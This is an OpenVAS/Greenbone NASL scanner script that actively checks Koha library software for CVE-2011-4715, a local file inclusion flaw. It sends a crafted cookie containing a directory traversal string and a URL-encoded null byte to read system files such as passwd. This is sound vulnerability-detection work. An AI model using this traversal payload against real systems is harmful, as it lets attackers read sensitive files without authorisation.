# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:koha:koha";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902593");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-11-29 17:17:17 +0530 (Tue, 29 Nov 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2011-4715");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Koha < 4.5 Build 4500 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_koha_http_detect.nasl");
  script_mandatory_keys("koha/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Koha is prone to local file inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to the cgi-bin/opac/opac-main.pl script not
  properly sanitizing user input supplied to the cgi-bin/koha/mainpage.pl script via the
  'KohaOpacLanguage' cookie. This can be exploited to include arbitrary files from local resources
  via directory traversal attacks and URL-encoded NULL bytes.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  potentially sensitive information and execute arbitrary local scripts in the context of the web
  server process.");

  script_tag(name:"affected", value:"Koha version 4.02.06 and prior.");

  script_tag(name:"solution", value:"Update to version 4.5 Build 4500 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46980/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50812");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18153");
  script_xref(name:"URL", value:"http://www.vigasis.com/en/?guncel_guvenlik=LibLime%20Koha%20%3C=%204.2%20Local%20File%20Inclusion%20Vulnerability&lnk=exploits/18153");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

files = traversal_files( "linux" );

url = "/cgi-bin/koha/opac-main.pl";

req = http_get(item: url, port: port);

foreach file (keys(files)) {
  cookie = "sessionID=1;KohaOpacLanguage=../../../../../../../../" + files[file] + "%00";

  req1 = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');
  res = http_keepalive_send_recv(port: port, data: req1);

  if (egrep(pattern: file, string: res)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
